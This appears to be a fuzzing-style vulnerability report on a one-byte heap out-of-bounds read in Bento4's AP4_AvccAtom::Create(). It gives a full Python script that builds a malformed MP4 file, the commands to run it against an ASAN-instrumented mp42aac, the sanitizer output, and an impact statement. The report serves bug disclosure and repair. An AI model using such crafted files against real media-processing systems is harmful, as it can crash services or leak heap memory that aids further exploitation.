## Bug0: Heap Out-of-Bounds Read in AP4_AvccAtom::Create() via num_pic_params Access Before Bounds Check

In `AP4_AvccAtom::Create()` in `Ap4AvccAtom.h` at line 88, `payload[cursor++]` reads one byte past the end of the heap-allocated payload buffer before the bounds check on line 89 executes, producing a one-byte heap out-of-bounds read.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def make_box(box_type, payload):
    if isinstance(box_type, str):
        box_type = box_type.encode('ascii')
    size = 8 + len(payload)
    return struct.pack('>I', size) + box_type + payload

# avcC box: size=14, payload=6 bytes
# payload[5]=0xE0 → numSequenceParameterSets = 0xE0 & 0x1f = 0
# seq-param loop runs 0 times → cursor==6==payload_size
# line 88: num_pps = payload[cursor++] reads payload[6] → 1-byte OOB
avcc_payload = b'\x01\x42\x00\x1e\xff\xe0'
avcc_box = struct.pack('>I', 14) + b'avcC' + avcc_payload

# avc1 VisualSampleEntry body (82 bytes)
avc1_body = (
    b'\x00' * 6 +
    struct.pack('>H', 1) +
    b'\x00\x00' +
    b'\x00\x00' +
    b'\x00' * 12 +
    struct.pack('>H', 320) +
    struct.pack('>H', 240) +
    struct.pack('>I', 0x00480000) +
    struct.pack('>I', 0x00480000) +
    b'\x00' * 4 +
    struct.pack('>H', 1) +
    b'\x00' * 32 +
    struct.pack('>H', 0x0018) +
    struct.pack('>H', 0xFFFF)
)

avc1_size = 8 + len(avc1_body) + len(avcc_box)
avc1_box  = struct.pack('>I', avc1_size) + b'avc1' + avc1_body + avcc_box

stsd_payload = (
    struct.pack('>I', 0) +
    struct.pack('>I', 1) +
    avc1_box
)
stsd_box = make_box('stsd', stsd_payload)

stts_box = make_box('stts', b'\x00' * 8)
stsc_box = make_box('stsc', b'\x00' * 8)
stsz_box = make_box('stsz', b'\x00' * 12)
stco_box = make_box('stco', b'\x00' * 8)
stbl_box = make_box('stbl', stsd_box + stts_box + stsc_box + stsz_box + stco_box)

vmhd_box = make_box('vmhd', struct.pack('>I', 1) + b'\x00' * 8)

url_entry = struct.pack('>I', 12) + b'url ' + struct.pack('>I', 1)
dref_box  = make_box('dref', struct.pack('>I', 0) + struct.pack('>I', 1) + url_entry)
dinf_box  = make_box('dinf', dref_box)
minf_box  = make_box('minf', vmhd_box + dinf_box + stbl_box)

mdhd_box = make_box('mdhd', b'\x00' * 24)
hdlr_payload = (
    b'\x00' * 4 +
    b'\x00' * 4 +
    b'vide' +
    b'\x00' * 12 +
    b'\x00'
)
hdlr_box = make_box('hdlr', hdlr_payload)
mdia_box = make_box('mdia', mdhd_box + hdlr_box + minf_box)

tkhd_box = make_box('tkhd', b'\x00' * 84)
trak_box = make_box('trak', tkhd_box + mdia_box)
mvhd_box = make_box('mvhd', b'\x00' * 100)
moov_box = make_box('moov', mvhd_box + trak_box)

ftyp_box = struct.pack('>I', 16) + b'ftyp' + b'isom' + b'\x00\x00\x00\x00'
mp4_data = ftyp_box + moov_box

with open('poc_input.mp4', 'wb') as f:
    f.write(mp4_data)

print(f"[+] Written poc_input.mp4 ({len(mp4_data)} bytes)")
print(f"[+] avcC payload: {avcc_payload.hex()}, numSequenceParameterSets=0 (OOB trigger)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000116 at pc 0x55b4e180eb75 bp 0x7fffdd9e1cf0 sp 0x7fffdd9e1ce0
READ of size 1 at 0x502000000116 thread T0
    #0 0x55b4e180eb74 in AP4_AvccAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0x9fab74)
    #1 0x55b4e17e61e1 in AP4_AtomFactory::CreateAtomFromStream(AP4_ByteStream&, unsigned int, unsigned int, unsigned long long, AP4_Atom*&) (mp42aac+0x9d21e1)

### Impact

An attacker who supplies a crafted MP4 file to any mp42aac invocation can trigger a one-byte heap out-of-bounds read immediately past a six-byte allocation, leaking one byte of adjacent heap content such as allocator metadata or data from a neighboring parsed box. This information disclosure can assist in defeating ASLR and in turn aid further exploitation, while also causing a process abort under ASAN or unpredictable behavior in production builds. No authentication or special privilege is required because mp42aac processes untrusted input files by design.
